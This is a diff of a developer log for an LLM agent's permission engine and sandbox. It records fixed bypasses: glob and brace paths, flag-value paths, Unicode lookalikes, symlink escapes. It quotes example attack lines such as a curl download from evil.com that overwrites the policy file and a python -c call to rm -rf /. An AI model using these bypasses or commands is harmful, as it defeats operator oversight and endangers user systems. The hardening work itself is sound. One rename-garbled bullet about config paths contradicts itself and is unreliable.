+| 3 | `src/permissions/resolvers/bash.ts:1473` analyzeCommand | Shell brace + glob expansion bypassed `classifyProtectedPath`. New `expandBraces` deterministically enumerates `{a,b,c}` and re-runs the classifier per branch. New `containsGlobMetachar` + `globLiteralPrefix` + `couldGlobReachProtected` refuse globs whose literal prefix could expand into system-level protected zones (`/proc`, `/sys`, `/etc`, `~/.ssh`, etc.). cwd-relative escalate dirs (`.git`, `.forja`, `.claude`) deliberately excluded from the bypass check to avoid false-positive on legitimate `*.ts` in cwd. |
 | 4 | `src/permissions/sandbox-runner.ts:147` buildBwrapArgv | `--bind <cwd> <cwd>` follows symlinks at the source — symlink in cwd pointing to `~/.aws/sso/cache` (or shared cache) escapes the sandbox boundary. Documented as known limitation (bwrap has no flag to refuse following symlinks at bind time) with operator mitigations (don't run from a cwd containing such symlinks; pre-`realpath` cwd; use `--sandbox-host`). Adjacent fix: pre-build `cwd-in-hide_paths-dir` precondition refuse — pre-slice this would silently produce a sandbox where the cwd mount vanishes mid-run. |
 | 5 | `src/permissions/sandbox-hide-paths.ts` | List drift vs `src/subagents/sensitive-paths.ts` (`.git-credentials` in the latter, not the former). Expanded canonical list: added `.config/azure`, `.config/op`, `.config/sops`, `.terraform.d`, `.ansible`, `.local/share/forja` (audit DB — sandboxed process now cannot mutate the hash chain via direct sqlite writes), `.boto` (legacy AWS), `.git-credentials`. New `tests/permissions/sandbox-hide-paths.test.ts` carries a fence test that requires every `SENSITIVE_PATH_DENY_LIST` entry to have an explicit mapping (dir/file/unmappable) — future drift in either list fails the fence loudly. |
 | 6 | `src/permissions/sandbox-runner-macos.ts:107` buildSbplProfile | macOS `(allow file-write* (subpath "/private/var/folders"))` exposed the entire per-user TMPDIR root including Keychain ephemeral state, `com.apple.security.*` caches, credential-helper sockets. Linux uses a fresh `--tmpfs /tmp`; macOS just unlocked the host path. Removed. Tools needing TMPDIR can prefix `TMPDIR=/tmp <cmd>` or use host-passthrough. |
@@ -14379,7 +15683,7 @@ Roadmap left in the R-bucket scope: only R12's fuzz CI workflow (aspirational, n
 - **Doctor / CLI**:
   - `sealingCheck` wraps factory→list call in try/finally with `store.close()` — today's worm-file impl is a no-op, future s3/rfc3161 backends leak without it.
   - `doctor-cache.ts` shared singleton contract now documented for SessionStart callers: long-lived processes MUST call `resetSharedDoctorCache()` at SessionStart boundaries OR pass a fresh per-call cache. Mid-session re-checks correctly reuse the cache.
-  - `args.ts:parseWelcomeSubcommand` now finds `welcome` in ANY position — POSIX-style `agent --i-know-what-im-doing welcome` works (was rejected pre-slice as a top-level flag misuse).
+  - `args.ts:parseWelcomeSubcommand` now finds `welcome` in ANY position — POSIX-style `forja --i-know-what-im-doing welcome` works (was rejected pre-slice as a top-level flag misuse).
 
 - **Broker** (`src/broker/in-process.ts`):
   - `linkSignals` returns `{ signal, dispose }` — disposer called in the per-call finally block unhooks `{once:true}` listeners on non-firing sources. Pre-slice listeners accumulated per call on long-lived caller signals + the never-aborting master signal in a long-lived broker. Behavioral change: post-return aborts of the caller signal no longer propagate to the linked signal exec stashed (intentional; documented; updated slice-83 test to assert in-flight propagation only).
@@ -14418,7 +15722,7 @@ Roadmap left in the R-bucket scope: only R12's fuzz CI workflow (aspirational, n
 ### Decisions
 
 - **One slice, not five.** Each of the 22 findings was small; the file surfaces overlap enough (bash resolver = 6 findings, sandbox runners = 4, doctor = 3, broker = 1, etc.) that splitting into per-finding slices would have multiplied test-update overhead. The cluster review pass that surfaced the punch list is the natural commit unit.
-- **Glob/brace bypass: refuse globs into system-protected zones, NOT into cwd-protected zones.** Initial implementation refused any glob whose literal prefix overlapped with any protected target — broke legitimate `find . -name "*.ts"` because `*.ts` resolved to `/work/proj/<glob>` which "could reach" `/work/proj/.git`. The threat is system-level (attacker writes `/e*/passwd` to reach `/etc/passwd`); cwd-level protected dirs (`.git`, `.agent`, `.claude`) are caught by the deterministic brace expansion when the LLM types `/work/proj/{.git,foo}`. Single-pass dirty tracking on `couldGlobReachProtected` excludes `cwdEscalateDirs`.
+- **Glob/brace bypass: refuse globs into system-protected zones, NOT into cwd-protected zones.** Initial implementation refused any glob whose literal prefix overlapped with any protected target — broke legitimate `find . -name "*.ts"` because `*.ts` resolved to `/work/proj/<glob>` which "could reach" `/work/proj/.git`. The threat is system-level (attacker writes `/e*/passwd` to reach `/etc/passwd`); cwd-level protected dirs (`.git`, `.forja`, `.claude`) are caught by the deterministic brace expansion when the LLM types `/work/proj/{.git,foo}`. Single-pass dirty tracking on `couldGlobReachProtected` excludes `cwdEscalateDirs`.
 - **macOS TMPDIR breakage accepted.** Removing `/private/var/folders` write breaks NSTemporaryDirectory-hardcoded tools. The right alternative (mint a per-sandbox tempdir + bind it as TMPDIR) requires runtime side effects beyond the pure-function runner contract. Documented operator escape hatches (TMPDIR override, host-passthrough). Future slice can revisit with the runtime-tempdir approach.
 - **Subagent child audit sink defensively falls back to noop.** `ensureInstallId` can throw if `$HOME`/`$XDG_CONFIG_HOME` aren't writable — the parent's spawn path would catch the same issue first in 99% of cases, but if it slips through the child still runs (without chain coverage) rather than crashing. This is a conservative trade-off; future slice could refuse to start child entirely on identity-discovery failure.
 - **Broker linkSignals dispose changes post-return signal semantics.** Pre-slice 121 the signal was pass-through (identity preserved); slice 121 composed signals (broke identity, kept post-return aborts working). Slice 125 disposes listeners on natural completion — post-return aborts no longer propagate. This is the right trade-off for a long-lived broker (which is the production shape) but did break one slice-83 test that pinned post-return propagation. Test updated to assert in-flight propagation only.
@@ -14427,7 +15731,7 @@ Roadmap left in the R-bucket scope: only R12's fuzz CI workflow (aspirational, n
 
 ### Trap navigated
 
-- **Glob bypass false-positives on cwd globs.** First pass refused every glob under cwd because `.git`/`.agent`/`.claude` are cwd-relative protected dirs. Three find tests failed (`find . -name "*.ts"`, etc.). Fix: exclude `cwdEscalateDirs` from the bypass-could-reach check; let brace expansion handle the deterministic case and let classifyProtectedPath handle the per-expansion check. System-level zones are what the bypass attack actually targets.
+- **Glob bypass false-positives on cwd globs.** First pass refused every glob under cwd because `.git`/`.forja`/`.claude` are cwd-relative protected dirs. Three find tests failed (`find . -name "*.ts"`, etc.). Fix: exclude `cwdEscalateDirs` from the bypass-could-reach check; let brace expansion handle the deterministic case and let classifyProtectedPath handle the per-expansion check. System-level zones are what the bypass attack actually targets.
 - **`escapeSbplLiteral` reject on `\n` is defense-in-depth, not active defense.** POSIX permits newlines in paths. No legitimate Forja invocation hits this. But if an LLM somehow constructs a path with `\n` and Forja built an SBPL profile with that as a literal, the line-joined profile would have an injection. Reject loudly so the call fails early and visibly.
 - **Slice 83 test was over-specified for identity.** The test asserted `expect(captured.signal).toBe(ac.signal)` — strict reference equality. Composition (slice 121) and disposers (slice 125) both break that invariant. The contract pre-slice was "identity preservation"; the contract post-slice 121 was "behavioral propagation"; the contract post-slice 125 is "in-flight behavioral propagation". Each refinement narrows the visible contract. Test updated each time.
 - **`openDb` readonly path opens with `create: false` implicit.** Bun's `Database(path, { readonly: true })` doesn't accept a `create` flag — readonly DBs can't be created. If the file doesn't exist, open throws ENOENT. The `existsSync` guard in chainCheck already handles that path → returns "no chain yet" without ever calling openDb. Belt-and-suspenders: comment in `openDb` documents the implicit semantics.
@@ -14510,7 +15814,7 @@ Slices 95–124 (30 consecutive) closed all 56 P0/P1 findings except R9 P0 #10 (
 |---|---|---|---|
 | — | P1 | `doctor.dirWritable` short-circuited on `existsSync(dir)` and returned `writable: true` without probing — a dir at chmod 0500 (read+exec, no write) passed `config_dir` → `ok` but every runtime fs op on the path failed | `accessSync(dir, W_OK)` probe when dir exists; surface EACCES verbatim |
 | — | P1 | `doctor.macLsmCheck` AppArmor branch emitted `warn: "aa-status at <path> but enabled probe failed"` when the binary was installed but the kernel module wasn't loaded — the COMMON case on Fedora/Arch | Surface as `warn: "AppArmor userspace present but kernel enforcement disabled"` with remediation walking through aa-status exit codes |
-| — | P1 | `args.ts` top-level parser silently accepted `--i-know-what-im-doing` and set `args.iKnowWhatImDoing = true`, but the flag is only read inside the `args.welcome === true` branch in `run.ts` — `agent --i-know-what-im-doing` (no welcome verb) parsed successfully and did nothing | Top-level case returns error pointing operator at `agent welcome --i-know-what-im-doing` |
+| — | P1 | `args.ts` top-level parser silently accepted `--i-know-what-im-doing` and set `args.iKnowWhatImDoing = true`, but the flag is only read inside the `args.welcome === true` branch in `run.ts` — `forja --i-know-what-im-doing` (no welcome verb) parsed successfully and did nothing | Top-level case returns error pointing operator at `forja welcome --i-know-what-im-doing` |
 | — | P1 | `welcome.ts` "Sandbox setup skipped" output didn't show the marker's `# created: <iso>` timestamp; operators with no way to recall WHEN they opted into unsafe mode without manually cat'ing the marker | New `readSandboxSkipMetadata` in `sandbox-skip.ts` parses the marker body with O_NOFOLLOW + 1 KiB cap; welcome surfaces "marker present at <path> (created <ts>, version <v>)" when metadata available, falls back to the old single-line message otherwise |
 
 ### Surface
@@ -14518,11 +15822,11 @@ Slices 95–124 (30 consecutive) closed all 56 P0/P1 findings except R9 P0 #10 (
 | File | Change |
 |---|---|
 | `src/cli/doctor.ts` | `accessSync` + `fsConstants` imports added. `dirWritable` probes `accessSync(dir, W_OK)` when dir exists (was: trusted `existsSync` blindly). `macLsmCheck` AppArmor failed-probe branch reworded to "kernel enforcement disabled" with remediation walking through `aa-status` exit codes (4 = no kernel support, 2 = module not loaded). |
-| `src/cli/args.ts` | Top-level case `--i-know-what-im-doing` now returns an error pointing operator at `agent welcome --i-know-what-im-doing`. Welcome subcommand parser unchanged (continues to accept the flag in the welcome context, per slice 91 contract). |
+| `src/cli/args.ts` | Top-level case `--i-know-what-im-doing` now returns an error pointing operator at `forja welcome --i-know-what-im-doing`. Welcome subcommand parser unchanged (continues to accept the flag in the welcome context, per slice 91 contract). |
 | `src/cli/sandbox-skip.ts` | New `readContent` primitive on `SandboxSkipFs` (production uses `openSync` with `O_NOFOLLOW`, hard-capped at 1 KiB read). New `MARKER_MAX_BYTES = 1024` constant. New `readSandboxSkipMetadata(options)` exported function: lstat → reject non-regular-file → read → parse `# created: <iso>` and `# version: <string>` lines. Returns null on absent / unreadable / non-regular-file. `SandboxSkipMetadata` interface exported. |
 | `src/cli/welcome.ts` | Import `readSandboxSkipMetadata` + `SandboxSkipMetadata` type. New `readSkipMarker` injectable in `RunWelcomeOptions`. When `hasSkip` fires (marker present, no `--i-know-what-im-doing` flag), welcome reads metadata; if `createdAt` is present, prints "marker present at <path> (created <ts>[, version <v>])"; otherwise prints the legacy single-line fallback. |
 | `tests/cli/doctor.test.ts` | +2 tests: `config_dir on chmod 0500 → fail` (real fs setup: mkdirSync + chmodSync + cleanup with chmod-back); `mac_lsm: AppArmor binary present but kernel disabled → warn with remediation`. |
-| `tests/cli/args.test.ts` | +3 tests in new describe `--i-know-what-im-doing top-level rejection (slice 123)`: bare top-level rejects with pointer; `agent welcome --i-know-what-im-doing` still parses; top-level with sibling flags also rejects. |
+| `tests/cli/args.test.ts` | +3 tests in new describe `--i-know-what-im-doing top-level rejection (slice 123)`: bare top-level rejects with pointer; `forja welcome --i-know-what-im-doing` still parses; top-level with sibling flags also rejects. |
 | `tests/cli/sandbox-skip.test.ts` | +6 tests in new describe `readSandboxSkipMetadata (slice 123)`: parses created+version; ENOENT → null; symlink → null; readContent throws → null; missing `# created:` line → no `createdAt`; whitespace in createdAt is trimmed. |
 | `tests/cli/welcome.test.ts` | Existing "marker present" test updated to inject `readSkipMarker: () => null` so the fallback branch is exercised explicitly. +2 new tests: marker with metadata → output contains timestamp + version; marker with metadata but no version → output contains timestamp only (no "version " substring). |
 
@@ -14538,7 +15842,7 @@ Slices 95–124 (30 consecutive) closed all 56 P0/P1 findings except R9 P0 #10 (
 
 ### Trap navigated
 
-- **doctor config_dir path is `~/.config/agent`, not `~/.config/forja`.** Initial chmod test used `${tmp}/.config/forja` and the test failed with `status: 'ok'` because doctor's `installIdPath` resolves to `~/.config/agent/install_id`, not `forja`. Fix: chmod the actual `${tmp}/.config/agent` dir. Spec naming and runtime naming diverged here historically (the sandbox_skip marker IS under `~/.config/forja/`; the engine state IS under `~/.config/agent/`); slice 123 doesn't reconcile that, just tests the right path.
+- **doctor config_dir path is `~/.config/forja`, not `~/.config/forja`.** Initial chmod test used `${tmp}/.config/forja` and the test failed with `status: 'ok'` because doctor's `installIdPath` resolves to `~/.config/forja/install_id`, not `forja`. Fix: chmod the actual `${tmp}/.config/forja` dir. Spec naming and runtime naming diverged here historically (the sandbox_skip marker IS under `~/.config/forja/`; the engine state IS under `~/.config/forja/`); slice 123 doesn't reconcile that, just tests the right path.
 - **Existing welcome marker-present test depended on disk state.** Pre-slice the test injected `hasSkipMarker: () => true` but did NOT inject `readSkipMarker`; the production default would have gone to the actual filesystem and could have leaked a real marker on the test machine into the output. Updated the test to explicitly inject `readSkipMarker: () => null` so the fallback message is exercised deterministically. Pattern: any new injectable seam SHOULD be threaded through existing tests that touch the same code path, not just covered by new tests.
 - **Biome `organizeImports` flagged 3 files after the slice edits.** Same trap as slice 122: import statements added in declaration order, not alphabetical. `bun run lint:fix` auto-sorted; no behavioral change.
 
@@ -14829,7 +16133,7 @@ Slice 118 ships the bwrap argv plumbing. macOS (sandbox-exec / SBPL) follows the
 
 - **`--tmpfs` for dirs, `--ro-bind-try /dev/null` for files.** bwrap can't tmpfs a single file (tmpfs is a directory mount), so file targets use the `/dev/null` overlay. The `-try` suffix on the file variant defensive: if `/dev/null` is somehow unavailable in a weird container env without proper /dev, the bind is skipped rather than failing the whole sandbox setup. Dirs use straight `--tmpfs` (always succeeds, creates the target if missing).
 - **Mask applies to ALL sandboxed profiles, not just home-rw.** The `--ro-bind / /` in `COMMON_PROFILE_FLAGS` exposes home read-only in every profile (ro, cwd-rw, cwd-rw-net). Reading credentials is a leak regardless of writability. The mask applies uniformly; only `host` (no bwrap wrap) skips.
-- **Spec canonical list, not slice 97's tilde-escalate list.** Slice 97's TILDE_ESCALATE_DIRS includes `.config/agent` + `.config/claude` (engine config, written by the agent itself). Those SHOULD survive into the sandbox (agent reads its own state). The §9 hide_paths list is narrower — explicitly the credential surfaces (.ssh, .aws, .config/gcloud, .gnupg, .kube + the four files). Two different concerns, two different lists.
+- **Spec canonical list, not slice 97's tilde-escalate list.** Slice 97's TILDE_ESCALATE_DIRS includes `.config/forja` + `.config/claude` (engine config, written by the agent itself). Those SHOULD survive into the sandbox (agent reads its own state). The §9 hide_paths list is narrower — explicitly the credential surfaces (.ssh, .aws, .config/gcloud, .gnupg, .kube + the four files). Two different concerns, two different lists.
 - **Mounts AFTER the writable bind.** bwrap applies mount operations in argv order; the LAST mount wins for overlapping paths. The home-rw test pins this: `--bind home home` appears at index N, `--tmpfs home/.ssh` at index N+M (M > 0). If the order ever flipped, the test fails loudly.
 - **No "scrub_env on the runtime side" here.** That was already done at the broker layer in slice 105 (default env passed to worker is `scrubEnv(process.env)`). The runtime sandbox env is inherited from the worker, so it's already scrubbed. The §9 spec lists `scrub_env` alongside `hide_paths` but they're at different layers — env at the spawn boundary, paths at the mount boundary. Slice 105 closed the env half; slice 118 closes the path half.
 - **macOS deferred.** sandbox-exec uses SBPL (Sandbox Profile Language) — entirely different grammar. The same defense applies but the implementation is parallel: `(deny file-read* (subpath "<absolute-path>"))` rules for each hide_paths entry. The Linux fix lands today; macOS is its own slice when it's higher priority than the remaining R-bucket findings.
@@ -15683,7 +16987,7 @@ The cap also disciplines the WORKER side. Pre-slice the worker entry's `readStdi
 
 - **16 MiB / 4 MiB defaults.** Picked well above any legitimate single-call response (grep over ~50k files lands well under 16 MiB), well below "memory pressure on the broker host" thresholds for the 8-16 GB typical machine. Operators with unusual workloads (large-LLM-output piping through bash) can raise via `maxStdoutBytes`. The asymmetry (stdout > stderr) reflects that stdout carries the canonical response while stderr is debug noise.
 - **Cancel the reader on cap-hit.** This is what actually closes the isolation gap. Without it, the worker's stdout would keep filling the pipe buffer + back-pressuring the worker, but the broker would still hold references to whatever bytes the worker had already flushed. Cancelling signals "we're done reading" to the stream — the worker's write returns EPIPE on the next chunk, the broker's memory usage stops growing.
-- **Truncation marker appended to text, not stripped.** Operators reading the BrokerResponse stdout (via `agent permission inspect` or audit log replay) need to see WHY the response is incomplete. A bare truncated string would look like a mid-message clip with no explanation; `<truncated at N bytes>` makes the cause self-explanatory.
+- **Truncation marker appended to text, not stripped.** Operators reading the BrokerResponse stdout (via `forja permission inspect` or audit log replay) need to see WHY the response is incomplete. A bare truncated string would look like a mid-message clip with no explanation; `<truncated at N bytes>` makes the cause self-explanatory.
 - **Short-circuit BEFORE the response parser runs.** Pre-slice the response parser would have failed on the truncated last line with "invalid response: <truncated...>" — technically correct but misattributing the cause to the worker producing bad JSON. The new branch returns the truncation envelope first, attributing the cause to the cap.
 - **Worker-side cap is symmetric (16 MiB).** Matches the broker's stdout cap. Asymmetric caps would create a routing trap where the broker accepted a request the worker would reject (or vice versa). One value, both directions.
 - **Worker-side cap throws, doesn't truncate-and-parse.** The handler is going to fail on truncated JSON anyway; the explicit throw with a clear message is more useful than letting the parse fail with a generic syntax error several layers deeper. The runtime catches and surfaces as the canonical response envelope.
@@ -15784,7 +17088,7 @@ Remaining roadmap from REVIEW_NOTES.md:
 
 **Done.** One-hundredth slice. Closes three R2 P1 findings on the bash resolver:
 
-- **#206 flag-prefix bypass in protected-path check (real bypass)**: the per-bash-arg §11 loop skipped any token starting with `-`. The `--flag=<value>` shape — `--config=/etc/agent/policy.toml`, `--output=/proc/sysrq-trigger` — looked like a flag and slipped past the classifier entirely. An LLM tricking a tool into accepting a protected path as a flag value could bypass §11. Fix: detect the `=` form, extract the value, classify it. Pure flags without `=` still skip (they carry no path content).
+- **#206 flag-prefix bypass in protected-path check (real bypass)**: the per-bash-arg §11 loop skipped any token starting with `-`. The `--flag=<value>` shape — `--config=/etc/forja/policy.toml`, `--output=/proc/sysrq-trigger` — looked like a flag and slipped past the classifier entirely. An LLM tricking a tool into accepting a protected path as a flag value could bypass §11. Fix: detect the `=` form, extract the value, classify it. Pure flags without `=` still skip (they carry no path content).
 - **#208 `python -c "code"` admitted under exec:python rules**: the interpreter resolver emitted `exec:arbitrary + read-fs:cwd` for ANY invocation regardless of args. A narrow policy `bash.allow: ['python *']` with `exec:python` capability admitted `python -c "import os; os.system('rm -rf /')"` under the same umbrella. Slice 100 refuses `-c <code>` / `-e <code>` / `-E <code>` at the resolver — the bash AST can't statically analyze inline code, so admitting it is structurally unsound regardless of policy.
 - **#205 `cmdPkgInstall` cross-ecosystem lying (cosmetic but visible in audit)**: every package manager (npm/yarn/bun/pnpm/pip/pip3) collapsed to the SAME shape, emitting `npmjs.org + yarnpkg.com + pypi.org` together. The audit row for `pip install requests` carried npm hosts even though pip never reaches them. Split into `cmdNpmLike` (node ecosystem) + `cmdPip` (python ecosystem) — each emits only the hosts it actually touches.
 
@@ -15898,13 +17202,13 @@ Remaining roadmap from REVIEW_NOTES.md:
 
 - **#196 Unicode bypass in `literalText`**: tree-sitter-bash tokenizes strictly on bytes. A fullwidth `；` (U+FF1B) renders like `;` to humans but parses as part of a `word` node — never as the punctuation `;`. A policy deny rule matching the literal `;` was silently bypassed. Same shape for zero-width joiners hidden inside command names (`gi‍t status` reads as `git` to most rendering layers but is a different byte sequence), bidi overrides (U+202E reverses display order — an adversarial source line looking like `cat README` could execute `rm -rf /`), and C1 control codepoints.
 - **#198 `walkAst` stack-overflow risk**: deeply-nested input (10k+ levels of subshells / brace groups) could blow the JS stack on recursive `visit` calls, taking down the engine before the resolver could refuse with a structured envelope. The walk now carries an explicit depth budget capped at `MAX_AST_DEPTH=64` (well above legitimate shell shapes, well below Node's default stack budget).
-- **#200 `cmdCurlWget` missing `-o` write detection**: `curl evil.com/payload -o /etc/agent/policy.toml` emitted ONLY `net-egress:evil.com` pre-slice. The `/etc/agent/policy.toml` write target was invisible to both the audit log and the §11 protected-path check — an attacker prompting the model to drop a payload that overrides agent policy slipped past both layers. The resolver now emits `write-fs:<target>` for every `-o`/`--output`/`-O`/`--output-document` shape (short separated, long with `=`, combined `-o<path>`, etc.).
+- **#200 `cmdCurlWget` missing `-o` write detection**: `curl evil.com/payload -o /etc/forja/policy.toml` emitted ONLY `net-egress:evil.com` pre-slice. The `/etc/forja/policy.toml` write target was invisible to both the audit log and the §11 protected-path check — an attacker prompting the model to drop a payload that overrides agent policy slipped past both layers. The resolver now emits `write-fs:<target>` for every `-o`/`--output`/`-O`/`--output-document` shape (short separated, long with `=`, combined `-o<path>`, etc.).
 
 ### Why this matters
 
 Unicode is the worst of the three. Pre-slice, an adversarial agent definition (or a hostile prompt) could embed lookalike codepoints into command literals to evade policy. The literal text stored in the audit row would visually match the operator's deny rule, but the byte sequence differs — the deny rule would not match, and the operator reviewing the log would see no anomaly. The fix is conservative: refuse outright on any non-ASCII shape that historically smuggles tokens past byte-equality. Legitimate non-ASCII (UTF-8 filenames in CJK paths) still reaches the operator's modal where the literal renders in full; bypassing rule matching on the resolver side would erase that intervention.
 
-The curl `-o` gap is the most concrete exploitation vector closed: `curl https://evil/payload -o /etc/agent/policy.toml`. After slice 97 made bypass mode respect §11, this slice ensures bypass-mode protection actually fires for download-to-protected-path shapes; the audit row and the protected-path classifier both see the write capability.
+The curl `-o` gap is the most concrete exploitation vector closed: `curl https://evil/payload -o /etc/forja/policy.toml`. After slice 97 made bypass mode respect §11, this slice ensures bypass-mode protection actually fires for download-to-protected-path shapes; the audit row and the protected-path classifier both see the write capability.
 
 The depth ceiling is pure defense-in-depth. In practice tree-sitter usually refuses pathological input via `parse_error` or `compound_statement` red-flagging before depth ever crosses 64, but the no-crash invariant matters when adversarial input slips past the parser as a deep but legitimate-looking shape. The audit/modal flow degrades gracefully on the structured refuse; a stack overflow would take the whole engine down.
 
@@ -15913,7 +17217,7 @@ The depth ceiling is pure defense-in-depth. In practice tree-sitter usually refu
 | File | Change |
 |---|---|
 | `src/permissions/resolvers/bash.ts` | New `containsUnicodeBypass(text)` predicate covering fullwidth Latin (U+FF00-FF5E), zero-width chars (U+200B-200D, U+FEFF, U+2060, U+180E), bidi overrides (U+202A-202E, U+2066-2069), and C1 control (U+0080-009F). `literalText` runs the predicate on every extracted literal — a match returns null, surfaced upstream as `dynamic content inside string arg`. New `MAX_AST_DEPTH=64` constant. `walkAst.visit` carries an explicit `depth: number` parameter; first thing it checks is `depth > MAX_AST_DEPTH` → refuse with `ast_depth_exceeded`. All three recursive call sites pass `depth + 1`; the top-level `visit(root)` call passes `0`. `cmdCurlWget` accepts a third `ctx` parameter; walks `tokens` looking for `-o <path>` / `--output <path>` / `-O <path>` / `--output-document <path>` / `--output=<path>` / `--output-document=<path>` / combined `-o<path>` shapes; honors the `-O-` / `-o -` (stdout) degenerate forms by skipping them. Each write target resolves through `resolveArg` and emits a `writeFs(target)` capability alongside the existing `netEgress` cap. |
-| `tests/permissions/resolvers.test.ts` | New describes for each finding: `Unicode bypass` (5 tests covering fullwidth `;`, ZWJ in command name, RTL override, BOM, no-false-positive on ASCII); `recursion depth ceiling` (2 tests proving the no-crash invariant on 100-level subshells + 1k-stage pipelines); `curl/wget -o write target` (6 tests covering short separated, long with `=`, wget `-O`, `-o-` stdout skip, no-flag regression, motivating `/etc/agent/policy.toml` exploit shape); `redirect $() target stays refused` (2 defensive tests pinning the existing R2 #201 refusal — `cmd > $(echo /etc/passwd)` and backtick form both refuse). |
+| `tests/permissions/resolvers.test.ts` | New describes for each finding: `Unicode bypass` (5 tests covering fullwidth `;`, ZWJ in command name, RTL override, BOM, no-false-positive on ASCII); `recursion depth ceiling` (2 tests proving the no-crash invariant on 100-level subshells + 1k-stage pipelines); `curl/wget -o write target` (6 tests covering short separated, long with `=`, wget `-O`, `-o-` stdout skip, no-flag regression, motivating `/etc/forja/policy.toml` exploit shape); `redirect $() target stays refused` (2 defensive tests pinning the existing R2 #201 refusal — `cmd > $(echo /etc/passwd)` and backtick form both refuse). |
 
 ### Decisions
 
@@ -15939,7 +17243,7 @@ R2 P0 remaining (deferred):
 R2 P1 deferred:
 - **#197 bash-parser.ts:88-93 no timeout**: tree-sitter can loop on pathological input. Different layer (parser, not resolver); deserves its own slice with a synchronous timeout mechanism.
 - **#205 `cmdPkgInstall` lies about pip/pip3 registry**: emits npm registry hosts for python tools. Cosmetic audit issue, not a bypass.
-- **#206 protected-path check skips flag-prefixed args**: `--config=/etc/agent/policy.toml` doesn't classify because `arg.startsWith('-')` short-circuits at line 900. Real bypass, fix-able by stripping the flag prefix before classification.
+- **#206 protected-path check skips flag-prefixed args**: `--config=/etc/forja/policy.toml` doesn't classify because `arg.startsWith('-')` short-circuits at line 900. Real bypass, fix-able by stripping the flag prefix before classification.
 - **#208 `cmdInterpreter` allows `python -c "import os; ..."`**: should refuse `-c` interpreter args like the bash resolver refuses dynamic content.
 
 Remaining roadmap from REVIEW_NOTES.md (unchanged):
@@ -16022,7 +17326,7 @@ Slice 96 ships `--against-archived-policy`: the canonical §17 reproducibility t
 
 Spec §17 calls for replay as a forensic tool: an operator investigating a past decision should be able to reconstruct what the engine saw and reproduce the verdict. Pre-slice:
 
-- The `policy_archive` table existed (migration 037, slice 50), the bootstrap wrote into it on every boot (bootstrap-engine.ts ~line 503), but **nothing read it**. The "active policy" branch (`--against-current-policy`) re-executed against `resolvePolicy(cwd)` — the CURRENT state of `.agent/permissions.yaml`. That's a drift-detection signal, not a reproducibility signal.
+- The `policy_archive` table existed (migration 037, slice 50), the bootstrap wrote into it on every boot (bootstrap-engine.ts ~line 503), but **nothing read it**. The "active policy" branch (`--against-current-policy`) re-executed against `resolvePolicy(cwd)` — the CURRENT state of `.forja/permissions.yaml`. That's a drift-detection signal, not a reproducibility signal.
 - Every replay regression test exercised the `decision: 'allow'` path. The deny and confirm pipelines had ZERO end-to-end test coverage. Refactors that broke deny replay or confirm replay would have shipped without a test failure. The `§23 [x]` claim was structurally false.
 
 The "✓ deterministic" verdict was also misleading. The replay engine in `tryReExecute` builds a disposable `createPermissionEngine(policy, {cwd, home, audit: createNoopSink()})` — no classifier, no grants snapshot, no sandbox plan, no telemetry, no session id. A row decided under a different classifier hash + a now-revoked grant + a degraded sandbox could still pass "deterministic" because the rule pipeline alone matched. Operators reading "✓ deterministic" without context could have assumed full reproducibility.
@@ -16193,7 +17497,7 @@ R11 follow-up (slice 95): apply `effective` at the child engine via new `Permiss
 
 ### Why this matters
 
-Slice 92 shipped the banner mechanics correctly but with one cosmetic gap: the banner read `⚠ Sandbox no longer available` with no reason suffix. Operators had to run `agent doctor` to find out WHY the engine degraded — even though `engine.degrade(reason)` already had the reason in scope. The plumbing was just missing.
+Slice 92 shipped the banner mechanics correctly but with one cosmetic gap: the banner read `⚠ Sandbox no longer available` with no reason suffix. Operators had to run `forja doctor` to find out WHY the engine degraded — even though `engine.degrade(reason)` already had the reason in scope. The plumbing was just missing.
 
 The fix is mechanical: the engine's `StateController` already records every transition with its reason in `history()`. `getDegradedReason()` walks history backwards to the most recent transition INTO `degraded` and returns its reason — but ONLY when the engine is currently degraded. Once `restore()` flips state back to ready, the function returns `undefined` (no degraded reason currently applies, even though history retains the row).
 
@@ -16244,7 +17548,7 @@ The §13.6 contract has three pieces and all three land in slice 92:
 
 - **Non-suppressible during the session.** No flag or env var silences the banner. Operators who explicitly acknowledge unsafe-mode (option [3] in sandbox setup, or `--i-know-what-im-doing` from slice 91) still see the recurring nudge — those mechanisms suppress the *prompt*, not the *banner*. The banner is the engine telling the operator "you're still degraded after N more calls, please investigate."
 - **Re-displayed every N tool calls (default 10).** The emitter counts tool dispatches; first call after entering degraded fires immediately (operators see the banner the moment confirm-on-every-call kicks in), then every Nth call thereafter.
-- **Logged in telemetry.** New `SandboxDegradedActiveEvent` in the §18 telemetry catalog. Operators with metric dashboards see `sandbox_degraded_active_total{reason}` rising while the engine stays degraded — a leading indicator that someone hasn't run `agent doctor` yet.
+- **Logged in telemetry.** New `SandboxDegradedActiveEvent` in the §18 telemetry catalog. Operators with metric dashboards see `sandbox_degraded_active_total{reason}` rising while the engine stays degraded — a leading indicator that someone hasn't run `forja doctor` yet.
 
 ### Surface
 
@@ -16255,7 +17559,7 @@ The §13.6 contract has three pieces and all three land in slice 92:
 | `src/telemetry/scrubbing.ts` | `scrubSandboxDegradedActive` branch added to the dispatcher. `reason` field runs through the same `PATH_REGEX` as state.transition.reason (subsystem-specific reasons like `bwrap binary missing at /usr/...` would leak paths otherwise). Other fields (kind, ts, sessionId UUID, firstEmission bool) pass through. |
 | `src/harness/types.ts` | New `sandbox_degraded_active` HarnessEvent variant: `{type, sessionId, reason, firstEmission}`. Doc references spec line 905-908 + clarifies that `firstEmission` lets renderers format the initial banner differently from recurring nudges. |
 | `src/harness/loop.ts` | Imports `createDegradedBannerEmitter`. Constructs the emitter once per `runAgent` invocation, between the `bgManager` block and the subagent dispatcher (similar run-scoped lifecycle). Closures over `config.permissionEngine.state()` for state reads + `config.onEvent` for HarnessEvent fan-out. In `invokeOne` (the per-tool-use worker), calls `degradedBannerEmitter.notifyToolCall(sessionId)` right after the `tool_finished` event. Single-line integration. |
-| `src/tui/harness-adapter.ts` | New `case 'sandbox_degraded_active'` in the translate switch. Emits THREE `warn` UIEvents: headline ("⚠ Sandbox no longer available [reason]" on firstEmission, "⚠ Sandbox still unavailable [reason]" on recurring), an effect line ("All tool calls now require manual confirmation."), and a recovery hint ("Run 'agent doctor' to investigate."). Matches the spec's example output verbatim. |
